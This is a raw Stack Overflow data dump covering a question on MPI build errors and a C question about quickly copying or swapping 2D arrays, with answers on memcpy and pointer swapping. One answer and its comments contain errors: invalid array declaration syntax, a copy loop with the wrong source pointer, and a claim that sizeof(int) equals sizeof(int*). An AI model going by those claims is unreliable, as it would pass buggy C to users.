"https://www.gravatar.com/avatar/0958c29d6df22ae886fc18962e42d532?s=128&d=identicon&r=PG", "display_name": "kostyabakay", "link": "https://stackoverflow.com/users/5175197/kostyabakay"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2638, "favorite_count": 1, "accepted_answer_id": 33660414, "answer_count": 1, "score": 1, "last_activity_date": 1447278266, "creation_date": 1447277084, "question_id": 33660147, "link": "https://stackoverflow.com/questions/33660147/why-mpi-doesnt-work-in-visual-studio-2015", "title": "Why MPI doesn&#39;t work in Visual Studio 2015?", "body": "<p>I downloaded and installed <code>mpich2-1.0.8p1-win-x86-64.msi</code> from the console with the administrator rights. I created empty win32 console project, I created file code.cpp and I pasted this example code.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include \"mpi.h\"\nint main(int argc, char* argv[])\n{\n    int ProcNum, ProcRank, RecvRank;\n    MPI_Status Status;\n    MPI_Init(&amp;argc, &amp;argv);\n    MPI_Comm_size(MPI_COMM_WORLD, &amp;ProcNum);\n    MPI_Comm_rank(MPI_COMM_WORLD, &amp;ProcRank);\n    if (ProcRank == 0)\n    { \n            printf(\"\\n Hello from process %3d\", ProcRank);\n        for (int i = 1; i &lt; ProcNum; i++)\n        {\n            MPI_Recv(&amp;RecvRank, 1, MPI_INT, MPI_ANY_SOURCE,\n                MPI_ANY_TAG, MPI_COMM_WORLD, &amp;Status);\n            printf(\"\\n Hello from process %3d\", RecvRank);\n        }\n    }\n    else\n        MPI_Send(&amp;ProcRank, 1, MPI_INT, 0, 0, MPI_COMM_WORLD);\n    MPI_Finalize();\n    return 0;\n}\n</code></pre>\n\n<p>Later I went to project properties to VC++ Directories and added include directories and library directories. In Linker/Input/Additional Dependencies I wrote mpi.lib and in C/C++/Language I allowed Open MP Support. When I compiled my project I have got strange errors. Can you help me? I can't understand what I made wrong, because I did it with tutorials.</p>\n\n<p><a href=\"https://i.stack.imgur.com/0yPuC.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/0yPuC.png\" alt=\"errors\"></a></p>\n"}, {"tags": ["c", "arrays", "pointers", "optimization", "multidimensional-array"], "comments": [{"owner": {"reputation": 1253974, "user_id": 22656, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/6d8ebb117e8d83d74ea95fbdd0f87e13?s=128&d=identicon&r=PG", "display_name": "Jon Skeet", "link": "https://stackoverflow.com/users/22656/jon-skeet"}, "edited": false, "score": 2, "creation_date": 1447276999, "post_id": 33660077, "comment_id": 55093764, "body": "Please edit your post to indicate (via tags) what language you&#39;re using. A short but complete example of what you&#39;re trying to do would help, too..."}, {"owner": {"reputation": 31, "user_id": 5547551, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11295c83c0bd53bd9c2fc90158f0f5f4?s=128&d=identicon&r=PG&f=1", "display_name": "thay2302", "link": "https://stackoverflow.com/users/5547551/thay2302"}, "edited": false, "score": 0, "creation_date": 1447277339, "post_id": 33660077, "comment_id": 55093939, "body": "Edited now, is that more clear?"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 2, "creation_date": 1447277533, "post_id": 33660077, "comment_id": 55094015, "body": "<code>memcpy</code> if the copy is really needed. If it is just to swap two arrays each time, work with a pointer which will be updated with the currently used array address (double-buffering)."}, {"owner": {"reputation": 115745, "user_id": 119527, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/lTjBL.png?s=128&g=1", "display_name": "Jonathon Reinhart", "link": "https://stackoverflow.com/users/119527/jonathon-reinhart"}, "edited": false, "score": 0, "creation_date": 1447277567, "post_id": 33660077, "comment_id": 55094033, "body": "<i>&quot;avoid a slow element-by-element copying procedure&quot;</i>  You want to copy a block of data from one place to another. There is no getting around it - it&#39;s just a matter of how fast you can make that copy."}, {"owner": {"reputation": 115745, "user_id": 119527, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/lTjBL.png?s=128&g=1", "display_name": "Jonathon Reinhart", "link": "https://stackoverflow.com/users/119527/jonathon-reinhart"}, "edited": false, "score": 1, "creation_date": 1447277655, "post_id": 33660077, "comment_id": 55094083, "body": "Note that your title indicates &quot;swapping&quot; arrays, but your actual question only implies &quot;copying&quot; one array to another. I think you need to explain what it is you&#39;re <i>actually</i> trying to do, and see if anyone can make a better suggestion."}, {"owner": {"reputation": 10498, "user_id": 669576, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/mRhrB.jpg?s=128&g=1", "display_name": "Johnny Mopp", "link": "https://stackoverflow.com/users/669576/johnny-mopp"}, "edited": false, "score": 0, "creation_date": 1447277660, "post_id": 33660077, "comment_id": 55094086, "body": "Maybe keep track of parts that have not changed since last time."}, {"owner": {"user_type": "does_not_exist", "display_name": "user824425"}, "edited": false, "score": 0, "creation_date": 1447277662, "post_id": 33660077, "comment_id": 55094089, "body": "I can&#39;t help but notice that you call this &quot;swap&quot; rather than &quot;copy&quot;. For what reason <i>exactly</i> do you need this operation?"}, {"owner": {"reputation": 31, "user_id": 5547551, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11295c83c0bd53bd9c2fc90158f0f5f4?s=128&d=identicon&r=PG&f=1", "display_name": "thay2302", "link": "https://stackoverflow.com/users/5547551/thay2302"}, "edited": false, "score": 0, "creation_date": 1447277919, "post_id": 33660077, "comment_id": 55094214, "body": "Sorry for the confusion, I only need to copy the array. In my loop I calculate the values of different elements of my array and then I need to make the elements of &quot;array&quot; the same as the elements of &quot;array_new&quot; so that the procedure can repeat for my new time step."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1447277953, "post_id": 33660077, "comment_id": 55094235, "body": "Why can&#39;t you just write the results into the new array in the same loop?"}, {"owner": {"reputation": 31, "user_id": 5547551, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11295c83c0bd53bd9c2fc90158f0f5f4?s=128&d=identicon&r=PG&f=1", "display_name": "thay2302", "link": "https://stackoverflow.com/users/5547551/thay2302"}, "edited": false, "score": 1, "creation_date": 1447278171, "post_id": 33660077, "comment_id": 55094350, "body": "Because in order to calculate the element array_new[i][j], I use the values array[i][j], array[i-1][j], array[i+1][j], array[i][j-1] and array [i][j+1]. So if I overwrite the element in array[i][j] straight away, I would end up using the wrong values when I came to calculate array_new[i][j+1]."}, {"owner": {"user_type": "does_not_exist", "display_name": "user824425"}, "edited": false, "score": 0, "creation_date": 1447278358, "post_id": 33660077, "comment_id": 55094442, "body": "@thay2302 That makes sense. However, I think you can still avoid the copy step if you don&#39;t need <code>array</code> after calculating <code>array_new</code>. If so, you could flip the roles of <code>array</code> and <code>array_new</code> for the following iteration."}, {"owner": {"reputation": 31, "user_id": 5547551, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11295c83c0bd53bd9c2fc90158f0f5f4?s=128&d=identicon&r=PG&f=1", "display_name": "thay2302", "link": "https://stackoverflow.com/users/5547551/thay2302"}, "edited": false, "score": 0, "creation_date": 1447278929, "post_id": 33660077, "comment_id": 55094732, "body": "Yeah I did think about this but it gives me problems later in my code when I use &quot;array&quot;. If nothing else then this should cut the time it takes to copy the elements over in half as I would only need to copy every other one from &quot;array_new&quot; to &quot;array&quot;. Thank you for your help."}, {"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1447282028, "post_id": 33660077, "comment_id": 55096229, "body": "You can&#39;t change what an array points to, since an array is not a pointer. <i>If you always access the arrays through pointers,</i> you can swap the pointers."}], "answers": [{"comments": [{"owner": {"reputation": 3134, "user_id": 5475209, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QRBxV.jpg?s=128&g=1", "display_name": "terence hill", "link": "https://stackoverflow.com/users/5475209/terence-hill"}, "edited": false, "score": 0, "creation_date": 1447278151, "post_id": 33660197, "comment_id": 55094337, "body": "what do you mean with &quot;Since the memory size of your array is fixed&quot;?"}, {"owner": {"reputation": 3238, "user_id": 3042438, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b930cad6b909cf6546dfe29bdeb8af88?s=128&d=identicon&r=PG&f=1", "display_name": "SunKnight0", "link": "https://stackoverflow.com/users/3042438/sunknight0"}, "reply_to_user": {"reputation": 3134, "user_id": 5475209, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QRBxV.jpg?s=128&g=1", "display_name": "terence hill", "link": "https://stackoverflow.com/users/5475209/terence-hill"}, "edited": false, "score": 1, "creation_date": 1447278236, "post_id": 33660197, "comment_id": 55094389, "body": "&#39;known&#39; was probably  a better word. As opposed to passing the array pointer to a function that does not &#39;know&#39; the actual size of the array."}, {"owner": {"reputation": 85822, "user_id": 597607, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jCzJi.png?s=128&g=1", "display_name": "Bo Persson", "link": "https://stackoverflow.com/users/597607/bo-persson"}, "edited": false, "score": 0, "creation_date": 1447278894, "post_id": 33660197, "comment_id": 55094714, "body": "I bet the optimizer will recognize the loops as a block copy, and use <code>memcpy</code>if that is faster."}, {"owner": {"reputation": 32490, "user_id": 327301, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/wJlLQ.png?s=128&g=1", "display_name": "yankee", "link": "https://stackoverflow.com/users/327301/yankee"}, "edited": false, "score": 0, "creation_date": 1447279715, "post_id": 33660197, "comment_id": 55095085, "body": "Well hopefullly the size of the array is known, otherwise you could not copy the array at all! I guess you mean &quot;known at compile time&quot;, and also &quot;declared as an array with a fixed size&quot;."}, {"owner": {"reputation": 31, "user_id": 5547551, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11295c83c0bd53bd9c2fc90158f0f5f4?s=128&d=identicon&r=PG&f=1", "display_name": "thay2302", "link": "https://stackoverflow.com/users/5547551/thay2302"}, "reply_to_user": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1447279963, "post_id": 33660197, "comment_id": 55095182, "body": "@Martin James That&#39;s what I&#39;m trying to do but I can&#39;t get it to work. Can you be more specific?"}], "tags": [], "owner": {"reputation": 3238, "user_id": 3042438, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b930cad6b909cf6546dfe29bdeb8af88?s=128&d=identicon&r=PG&f=1", "display_name": "SunKnight0", "link": "https://stackoverflow.com/users/3042438/sunknight0"}, "is_accepted": false, "score": 7, "last_activity_date": 1447277856, "last_edit_date": 1447277856, "creation_date": 1447277367, "answer_id": 33660197, "question_id": 33660077, "link": "https://stackoverflow.com/questions/33660077/fast-way-to-copy-an-array/33660197#33660197", "title": "Fast way to copy an array", "body": "<p>Since the memory size of your array is fixed, you can simply copy the memory block from one pointer to the other. It doesn't get any faster than that.</p>\n\n<p>In <code>c/c++</code> you could use <code>memcpy</code> if that is the language you are using. Every language has something equivalent.</p>\n\n<p>Edit: since you confirmed use of <code>c</code> I can get more detailed:</p>\n\n<pre><code>memcpy(array_new,array,sizeof(VARIABLE_TYPE_of_ARRAY_ELEMENT)*N_a*N_b);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 31, "user_id": 5547551, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11295c83c0bd53bd9c2fc90158f0f5f4?s=128&d=identicon&r=PG&f=1", "display_name": "thay2302", "link": "https://stackoverflow.com/users/5547551/thay2302"}, "edited": false, "score": 0, "creation_date": 1447278819, "post_id": 33660492, "comment_id": 55094681, "body": "Both of these give me a segmentation fault?"}, {"owner": {"reputation": 33597, "user_id": 2445184, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/0b51ece74c2314ba345a862c4b00d804?s=128&d=identicon&r=PG", "display_name": "cmaster - reinstate monica", "link": "https://stackoverflow.com/users/2445184/cmaster-reinstate-monica"}, "reply_to_user": {"reputation": 31, "user_id": 5547551, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11295c83c0bd53bd9c2fc90158f0f5f4?s=128&d=identicon&r=PG&f=1", "display_name": "thay2302", "link": "https://stackoverflow.com/users/5547551/thay2302"}, "edited": false, "score": 0, "creation_date": 1447278892, "post_id": 33660492, "comment_id": 55094713, "body": "@thay2302 Then there&#39;s something wrong with your arrays. How did you declare your arrays, how are you allocating them, and how are you destroying them?"}, {"owner": {"reputation": 31, "user_id": 5547551, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11295c83c0bd53bd9c2fc90158f0f5f4?s=128&d=identicon&r=PG&f=1", "display_name": "thay2302", "link": "https://stackoverflow.com/users/5547551/thay2302"}, "edited": false, "score": 0, "creation_date": 1447279211, "post_id": 33660492, "comment_id": 55094859, "body": "Arrays were declared as &quot;double **array, **array_new&quot;, they were allocated using &quot;allocate2d(&amp;array,N_a,N_b)&quot; and &quot;allocate2d(&amp;array_new,N_a,N_b)&quot; and are being destroyed using &quot;free2d(&amp;array,N_a)&quot; and &quot;free2d(&amp;array_new,N_a)&quot;."}, {"owner": {"reputation": 33597, "user_id": 2445184, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/0b51ece74c2314ba345a862c4b00d804?s=128&d=identicon&r=PG", "display_name": "cmaster - reinstate monica", "link": "https://stackoverflow.com/users/2445184/cmaster-reinstate-monica"}, "reply_to_user": {"reputation": 31, "user_id": 5547551, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11295c83c0bd53bd9c2fc90158f0f5f4?s=128&d=identicon&r=PG&f=1", "display_name": "thay2302", "link": "https://stackoverflow.com/users/5547551/thay2302"}, "edited": false, "score": 0, "creation_date": 1447279583, "post_id": 33660492, "comment_id": 55095028, "body": "Can you add the full failing code in your question? As I said, the pointer swap is generally sound the way I posted it, so there must be something else wrong with your code if you get a segfault with that pointer swap. Unfortunately, I&#39;ll be away from keyboard for the next 20 hours, but I&#39;ll certainly take a look tomorrow."}, {"owner": {"reputation": 31, "user_id": 5547551, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11295c83c0bd53bd9c2fc90158f0f5f4?s=128&d=identicon&r=PG&f=1", "display_name": "thay2302", "link": "https://stackoverflow.com/users/5547551/thay2302"}, "edited": false, "score": 0, "creation_date": 1447279858, "post_id": 33660492, "comment_id": 55095138, "body": "I can&#39;t really share the full code as it is for an assignment that I am doing. I&#39;ve tried to be reasonably unspecific with my questions but I can&#39;t realistically post the entire code on here."}, {"owner": {"reputation": 33597, "user_id": 2445184, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/0b51ece74c2314ba345a862c4b00d804?s=128&d=identicon&r=PG", "display_name": "cmaster - reinstate monica", "link": "https://stackoverflow.com/users/2445184/cmaster-reinstate-monica"}, "reply_to_user": {"reputation": 31, "user_id": 5547551, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11295c83c0bd53bd9c2fc90158f0f5f4?s=128&d=identicon&r=PG&f=1", "display_name": "thay2302", "link": "https://stackoverflow.com/users/5547551/thay2302"}, "edited": false, "score": 0, "creation_date": 1447356421, "post_id": 33660492, "comment_id": 55132401, "body": "@thay2302 Well, then you want to look for other pointers to your arrays: If you have two pointers <code>array</code> and <code>otherPtr</code> pointing to the same array, and you swap <code>array</code> with <code>array_new</code>, <code>otherPtr</code> will afterwards point to the same array as <code>array_new</code>. Producing such aliased pointers is common in C programming, but it must be avoided when doing stuff like pointer-swapping. For instance, if you freed <code>array_new</code> after the swap (does not sound too unlikely to me), <code>otherPtr</code> will still be pointing to the <code>free()</code>&#39;d memory region, so that dereferencing <code>otherPtr</code> may segfault your program."}], "tags": [], "owner": {"reputation": 33597, "user_id": 2445184, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/0b51ece74c2314ba345a862c4b00d804?s=128&d=identicon&r=PG", "display_name": "cmaster - reinstate monica", "link": "https://stackoverflow.com/users/2445184/cmaster-reinstate-monica"}, "is_accepted": false, "score": 0, "last_activity_date": 1447278622, "creation_date": 1447278622, "answer_id": 33660492, "question_id": 33660077, "link": "https://stackoverflow.com/questions/33660077/fast-way-to-copy-an-array/33660492#33660492", "title": "Fast way to copy an array", "body": "<p>Your pointer-swap code is just a little bit off: you are dereferencing your pointers where you shouldn't. After all, the point of that code is to avoid copying data by just swapping two pointers. Here are the correct versions (depending on whether you use a true 2D array or an array of pointers to arrays):</p>\n\n<pre><code>//array is declared as\ndouble (*array)[N_b];\n\ndouble (*temp)[N_b] = array;\narray = array_new;\narray_new = temp;\n</code></pre>\n\n<p>or</p>\n\n<pre><code>//array is declared as\ndouble** array;\n\ndouble** temp = array;\narray = array_new;\narray_new = temp;\n</code></pre>\n\n<p>This is all you need, and it's definitely the fastest possible way to exchange contents of two buffers. Much faster than <code>memcpy()</code>...</p>\n"}, {"comments": [{"owner": {"reputation": 2120, "user_id": 2194119, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/79578c172c9c6c1e39e85b6c1207f885?s=128&d=identicon&r=PG", "display_name": "Rad", "link": "https://stackoverflow.com/users/2194119/rad"}, "edited": false, "score": 0, "creation_date": 1466079925, "post_id": 33660547, "comment_id": 63175508, "body": "Shouldn&#39;t line #3 be like: <code>int** newArray = (int**)malloc(sizeof(int*) * SIZE_X);</code>? If not, what does this version mean? And when should I use it?"}, {"owner": {"reputation": 32490, "user_id": 327301, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/wJlLQ.png?s=128&g=1", "display_name": "yankee", "link": "https://stackoverflow.com/users/327301/yankee"}, "reply_to_user": {"reputation": 2120, "user_id": 2194119, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/79578c172c9c6c1e39e85b6c1207f885?s=128&d=identicon&r=PG", "display_name": "Rad", "link": "https://stackoverflow.com/users/2194119/rad"}, "edited": false, "score": 0, "creation_date": 1466093553, "post_id": 33660547, "comment_id": 63185749, "body": "@Rad: You added a cast which has no effect (at least I believe it works without, it is too long ago that I checked) and you used <code>sizeof(int*)</code> instead of <code>sizeof(int)</code>. All systems I am aware of implement <code>int*</code> as a plain <code>int</code>, so that would be the same. However I agree that it is better practice to write <code>int*</code> so I changed my answer."}, {"owner": {"reputation": 2120, "user_id": 2194119, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/79578c172c9c6c1e39e85b6c1207f885?s=128&d=identicon&r=PG", "display_name": "Rad", "link": "https://stackoverflow.com/users/2194119/rad"}, "edited": false, "score": 0, "creation_date": 1466099836, "post_id": 33660547, "comment_id": 63189462, "body": "Thanks for the info. My point was <code>sizeof(int*)</code>, not the casting. Just to make sure I understand it correctly, what about this one: <code>sizeof(char*)</code>. The way I understand <code>sizeof(type*)</code> returns the size of address on the machine (might be 4 or 8), but <code>sizeof(type)</code> returns the size of that specific type (e.g if it&#39;s <code>char</code> it returns 1). Is it correct?"}, {"owner": {"reputation": 32490, "user_id": 327301, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/wJlLQ.png?s=128&g=1", "display_name": "yankee", "link": "https://stackoverflow.com/users/327301/yankee"}, "reply_to_user": {"reputation": 2120, "user_id": 2194119, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/79578c172c9c6c1e39e85b6c1207f885?s=128&d=identicon&r=PG", "display_name": "Rad", "link": "https://stackoverflow.com/users/2194119/rad"}, "edited": false, "score": 0, "creation_date": 1466147997, "post_id": 33660547, "comment_id": 63206357, "body": "@Rad: Yes, that is correct. However an address is usually an <code>int</code> and thus size of address (for any type) is usually the same as an <code>int</code>. That means of course that <code>sizeof(int) == sizeof(int*)</code> but it also means <code>sizeof(char) != sizeof(char*)</code> (depending on the system)"}], "tags": [], "owner": {"reputation": 32490, "user_id": 327301, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/wJlLQ.png?s=128&g=1", "display_name": "yankee", "link": "https://stackoverflow.com/users/327301/yankee"}, "is_accepted": false, "score": 0, "last_activity_date": 1466093350, "last_edit_date": 1495542698, "creation_date": 1447278859, "answer_id": 33660547, "question_id": 33660077, "link": "https://stackoverflow.com/questions/33660077/fast-way-to-copy-an-array/33660547#33660547", "title": "Fast way to copy an array", "body": "<p>Two answer this, you first need to understand how the array is represented in memory. E.g. see this question: <a href=\"https://stackoverflow.com/questions/2565039/how-are-multi-dimensional-arrays-formatted-in-memory\">How are multi-dimensional arrays formatted in memory?</a></p>\n\n<p>So first we need to know if you have a static array or not. If it is a static array then the task is particularly simple, because the data is laid out contiguously in memory. This means that if you have a 2x2 static array, with the content <code>{{9, 8}, {7, 6}}</code> your memory could look like this:</p>\n\n<pre><code>Address  0  1  2  3  4  5  6  7  8\nContent  ?  ?  9  8  7  6  ?  ?  ?\n</code></pre>\n\n<p>In this case your variable which is declared like this:</p>\n\n<pre class=\"lang-c prettyprint-override\"><code>int[2][2] myArray;\n</code></pre>\n\n<p>is actually a pointer to address \"2\" and you can easily copy the whole thing. with memcpy:</p>\n\n<pre class=\"lang-c prettyprint-override\"><code>int [2][2] newArray;\nmemcpy(&amp;newArray, &amp;myArray, sizeof(int)*2*2);\n</code></pre>\n\n<p>Notice that this copies starting from wherever \"myArray\" points (in my example that is 2) as many bytes as 2*2*sizeof(int). So 4 times the size of int. (For simplicity my example assume a size of one byte for an int, but of course on most systems it is 4 byte).</p>\n\n<p>If you have a <strong>dynamic</strong> array, then it is a different story. In this case your memory for your array declared like this:</p>\n\n<pre class=\"lang-c prettyprint-override\"><code>int** myArray;\n</code></pre>\n\n<p>may well look like this:</p>\n\n<pre><code>Address  0  1  2  3  4  5  6  7  8\nContent  9  8  0  6  ?  ?  7  6  ?\n</code></pre>\n\n<p>Note that the pointer <code>myArray</code> still points to the Address \"2\". However at the address \"2\" you don't find the first value, but instead another pointer which points to \"0\". And here you find the values of the first \"row\" which are 9 and 8.\nNext to the address \"2\" in number \"3\" you find the pointer to your second \"row\" which starts at position 6. As you can see, you can still find all your data, but you cannot copy them in a single go. To copy the whole array you will at least need the outer row:</p>\n\n<pre class=\"lang-c prettyprint-override\"><code>int SIZE_X = 2;\nint SIZE_Y = 2;\nint** newArray = malloc(sizeof(int*)*SIZE_X);\nfor(i = 0; i &lt; SIZE_X; ++i) {\n  newArray[i] = malloc(sizeof(int)*SIZE_Y);\n  memcpy(newArray[i], myArray, SIZE_Y*sizeof(int));\n}\n</code></pre>\n\n<p>This should be faster then using two loops, as <a href=\"https://stackoverflow.com/questions/7776085/why-is-memcpy-and-memmove-faster-than-pointer-increments\">memcpy can use more efficient ways to copy than a copy loop</a>.</p>\n"}, {"comments": [{"owner": {"reputation": 31, "user_id": 5547551, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11295c83c0bd53bd9c2fc90158f0f5f4?s=128&d=identicon&r=PG&f=1", "display_name": "thay2302", "link": "https://stackoverflow.com/users/5547551/thay2302"}, "edited": false, "score": 0, "creation_date": 1447280219, "post_id": 33660751, "comment_id": 55095335, "body": "Sorry, I&#39;m struggling to follow this. So what is the typedef struct bit doing? What about if I&#39;ve already got all the elements of my two arrays &quot;array&quot; and &quot;array_new&quot;?"}, {"owner": {"reputation": 2059, "user_id": 2759368, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d03e2c110cced20e5bde6dc62146fcce?s=128&d=identicon&r=PG&f=1", "display_name": "nnn", "link": "https://stackoverflow.com/users/2759368/nnn"}, "reply_to_user": {"reputation": 31, "user_id": 5547551, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11295c83c0bd53bd9c2fc90158f0f5f4?s=128&d=identicon&r=PG&f=1", "display_name": "thay2302", "link": "https://stackoverflow.com/users/5547551/thay2302"}, "edited": false, "score": 0, "creation_date": 1447280778, "post_id": 33660751, "comment_id": 55095605, "body": "It&#39;s just encapsulating the array type definition / dimensions, to help with indexing. If you already have the array data, just initialize the pointers to it: <code>arr *p_array = your_array_address;</code>"}, {"owner": {"reputation": 31, "user_id": 5547551, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11295c83c0bd53bd9c2fc90158f0f5f4?s=128&d=identicon&r=PG&f=1", "display_name": "thay2302", "link": "https://stackoverflow.com/users/5547551/thay2302"}, "edited": false, "score": 0, "creation_date": 1447281220, "post_id": 33660751, "comment_id": 55095845, "body": "So if I have the values already then I should just use &quot;*p_array = &amp;array&quot;, &quot;*p_array_new = &amp;array_new&quot;, &quot;p_array = &amp;array_new&quot; and &quot;p_array_new = &amp;array&quot;?"}, {"owner": {"reputation": 31, "user_id": 5547551, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11295c83c0bd53bd9c2fc90158f0f5f4?s=128&d=identicon&r=PG&f=1", "display_name": "thay2302", "link": "https://stackoverflow.com/users/5547551/thay2302"}, "edited": false, "score": 0, "creation_date": 1447281382, "post_id": 33660751, "comment_id": 55095919, "body": "It&#39;s giving me errors saying &quot;initialization from incompatible pointer type&quot; and &quot;assignment from incompatible pointer type&quot;"}, {"owner": {"reputation": 2059, "user_id": 2759368, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d03e2c110cced20e5bde6dc62146fcce?s=128&d=identicon&r=PG&f=1", "display_name": "nnn", "link": "https://stackoverflow.com/users/2759368/nnn"}, "reply_to_user": {"reputation": 31, "user_id": 5547551, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11295c83c0bd53bd9c2fc90158f0f5f4?s=128&d=identicon&r=PG&f=1", "display_name": "thay2302", "link": "https://stackoverflow.com/users/5547551/thay2302"}, "edited": false, "score": 0, "creation_date": 1447281803, "post_id": 33660751, "comment_id": 55096127, "body": "I edited my answer to separate the pointer declaration and initialization. To avoid the warning / error, use a cast. For your array, you may not need to use <code>&amp;array</code>, but just <code>array</code> (especially if dynamically allocated). Use  <code>p_array = (arr*)array;</code>"}, {"owner": {"reputation": 31, "user_id": 5547551, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11295c83c0bd53bd9c2fc90158f0f5f4?s=128&d=identicon&r=PG&f=1", "display_name": "thay2302", "link": "https://stackoverflow.com/users/5547551/thay2302"}, "edited": false, "score": 0, "creation_date": 1447281935, "post_id": 33660751, "comment_id": 55096183, "body": "What do you mean use a cast?"}], "tags": [], "owner": {"reputation": 2059, "user_id": 2759368, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d03e2c110cced20e5bde6dc62146fcce?s=128&d=identicon&r=PG&f=1", "display_name": "nnn", "link": "https://stackoverflow.com/users/2759368/nnn"}, "is_accepted": false, "score": 0, "last_activity_date": 1447281556, "last_edit_date": 1447281556, "creation_date": 1447279581, "answer_id": 33660751, "question_id": 33660077, "link": "https://stackoverflow.com/questions/33660077/fast-way-to-copy-an-array/33660751#33660751", "title": "Fast way to copy an array", "body": "<p>If you just want to swap the pointers, not physically copying the data, and to still be able to access the arrays using indexes, here is an example of how it can be done:</p>\n\n<pre><code>#define N_a 2\n#define N_b 3\n\ntypedef struct arr \n{ \n    int val[N_a][N_b]; \n} arr;\n\narr array     = {{{11,12,13},{14,15,16}}};\narr array_new = {{{21,22,23},{24,25,26}}};\n\nint main()\n{\n    arr *p_array;\n    arr *p_array_new;\n\n    p_array     = &amp;array;\n    p_array_new = &amp;array_new;\n    printf(\"%d %d\\n\", p_array-&gt;val[1][2], p_array_new-&gt;val[1][2]);\n    // output: 16 26\n\n    p_array     = &amp;array_new;\n    p_array_new = &amp;array;\n    printf(\"%d %d\\n\", p_array-&gt;val[1][2], p_array_new-&gt;val[1][2]);\n    // output: 26 16\n}\n</code></pre>\n"}], "owner": {"reputation": 31, "user_id": 5547551, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11295c83c0bd53bd9c2fc90158f0f5f4?s=128&d=identicon&r=PG&f=1", "display_name": "thay2302", "link": "https://stackoverflow.com/users/5547551/thay2302"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2270, "favorite_count": 0, "answer_count": 4, "score": 2, "last_activity_date": 1466093350, "creation_date": 1447276807, "last_edit_date": 1447277799, "question_id": 33660077, "link": "https://stackoverflow.com/questions/33660077/fast-way-to-copy-an-array", "title": "Fast way to copy an array", "body": "<p>So at the end of each iteration that I'm doing, I want to make my array be equal to my new array (which I have called array_new). I want every element of array to take the same value as is in array_new but I'm interested in getting my code as quick as possible and so copying everything across element-by-element as this current code does isn't an option:</p>\n\n<pre><code>for(i=0;i&lt;N_a;i++) {\n  for(j=0;j&lt;N_b;j++) {\n    array[i][j] = array_new[i][j];\n  }\n}\n</code></pre>\n\n<p>This takes quite a long time because my values of N_a and N_b are very large. Is there a way to simply change what each of them point to so that I can start my next iteration more quickly? I've tried doing stuff like</p>\n\n<pre><code> double *temp = *array;\n *array = *array_new;\n *array_new = temp;\n</code></pre>\n\n<p>in order to 